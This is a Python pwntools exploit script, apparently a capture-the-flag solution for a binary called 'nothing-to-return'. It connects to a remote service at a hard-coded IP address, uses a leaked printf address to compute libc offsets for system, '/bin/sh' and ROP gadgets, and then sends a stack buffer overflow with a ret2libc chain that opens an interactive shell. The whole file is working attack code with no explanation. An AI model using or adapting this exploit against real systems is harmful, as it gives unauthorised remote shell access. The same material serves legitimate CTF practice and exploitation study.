from pwn import *
import time

# Load Environment
context.terminal = ['tmux','splitw' ,'-h']
#elf = ELF("./file")
#libc = ELF("./libc.so.6")
ld_preload = {"LD_PRELOAD": "libc.so.6"}


#p = process("./nothing-to-return")
p = remote("34.30.126.104", 5000)
#p = gdb.debug("./nothing-to-return", '''
#b *get_input+162
#b *main+108''')

# libc printf() leak
p.recvuntil("at ")
leak = p.recvline()
printf_leak = int(leak,16)
system_leak = printf_leak - 27376
execve_leak = printf_leak + 543424
libc_main_leak = printf_leak - 189776
libc_pop_rdi = printf_leak - 188395
libc_pop_rsi = printf_leak - 181599
libc_pop_rdx_rbx = printf_leak + 206345
binsh = printf_leak + 1350628
ret = printf_leak - 196035


print("printf leak: ", hex(printf_leak))
print("system leak: ", hex(system_leak))
print("execve leak: ", hex(execve_leak))
print("libc_main leak: ", hex(libc_main_leak))
print("binsh leak: ", hex(binsh))



# User Input Size
p.recvline()
inputSize = b"100"
p.sendline(inputSize)

# User Input
p.recvline()
payload  = b"A" * 72
payload += p64(libc_pop_rdi)
payload += p64(binsh)
payload += p64(system_leak)

p.sendline(payload)
p.interactive()
